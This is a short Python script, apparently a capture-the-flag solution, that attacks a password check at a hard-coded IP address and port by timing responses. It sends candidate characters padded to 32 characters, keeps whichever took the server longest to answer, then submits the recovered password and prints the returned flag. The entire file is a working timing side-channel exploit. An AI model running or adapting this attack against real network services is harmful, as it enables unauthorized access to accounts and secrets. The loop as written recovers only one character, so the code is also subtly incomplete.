import socket
import string
import time

host = "35.207.132.47"
port = 1337
pw = ''
chars = string.ascii_lowercase + string.digits
for _ in range(1):
    best_time = 0
    best_char = ''
    extra = ' ' * (32 - (len(pw) + 1))
    for char in chars:
        print("Trying", pw + char + extra)
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.connect((host, port))
            s.recv(1024)
            send = pw + char + extra + '\n'
            s.sendall(send.encode())
            start = time.time()
            data = s.recv(1024)
            duration = time.time() - start
        if duration > best_time:
            best_time = duration
            best_char = char
    pw += best_char
print("Password is", pw)

with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    s.connect((host, port))
    s.recv(1024)
    send = pw + '\n'
    s.sendall(send.encode())
    flag = s.recv(1024).decode().strip()
print(flag)
